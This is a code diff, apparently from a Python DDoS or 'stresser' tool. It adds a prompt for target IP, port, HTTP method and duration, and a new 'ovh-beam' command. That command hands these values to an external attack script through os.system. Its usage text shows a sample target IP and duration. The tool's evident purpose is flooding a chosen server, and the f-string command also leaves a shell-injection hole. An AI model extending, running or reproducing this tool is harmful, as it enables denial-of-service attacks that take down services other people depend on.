@@ -329,6 +329,17 @@ def get_info_l7b():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     t = input()
     return target, thread, methode, t
+    
+def get_info_l7c():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP      "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    port = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"METHODE  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    methode = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, port, methode, t
 
 def get_info_l4():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
@@ -1530,6 +1541,14 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+        
+    elif command == "ovh-beam":
+        target, port, methode, t = get_info_l7c()
+        try:
+            os.system(f'sh OVH-BEAM {methode} {target} {port} {t} 1024')
+        except IndexError:
+            print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+            print('Example: ovh-beam GET 51.38.92.223 80 60')
 
 ##############################################################################################
     elif command == "subnet":
